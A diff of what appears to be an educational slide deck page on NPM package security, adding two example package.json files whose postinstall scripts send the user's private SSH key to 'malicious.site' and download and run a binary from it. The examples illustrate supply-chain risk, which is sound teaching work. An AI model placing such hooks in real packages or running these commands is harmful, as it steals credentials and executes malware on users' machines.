@@ -1,5 +1,6 @@
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faShieldHalved } from "@fortawesome/pro-solid-svg-icons";
+import { Columns } from "../../../components/Columns";
 
 # <FontAwesomeIcon icon={faShieldHalved} /> NPM Package Security
 
@@ -14,10 +15,33 @@ using it after 15 seconds
 
 `left-pad` and `faker` were removed from NPM on purpose over various disputes
 
+---
+
 ### Postinstall Scripts
 
 Can potentially execute malicious code to grand remote shell access after installing a package
 
-## The solution?
+<Columns count={2}>
+    ```json
+    {
+        "name": "mypackage",
+        "main": "index.js",
+        "scripts": {
+            "postinstall": "curl http://malicious.site/send?data=$(cat ~/.ssh/id_rsa)"
+        }
+    }
 
-##### Regularly update (but not too often)
+    ```
+
+    ```json
+    {
+        "name": "mypackage",
+        "main": "index.js",
+        "scripts": {
+            "postinstall": "node -e \"require('child_process').execSync('wget http://malicious.site/malware && chmod +x malware && ./malware')\""
+        }
+    }
+
+    ```
+
+</Columns>
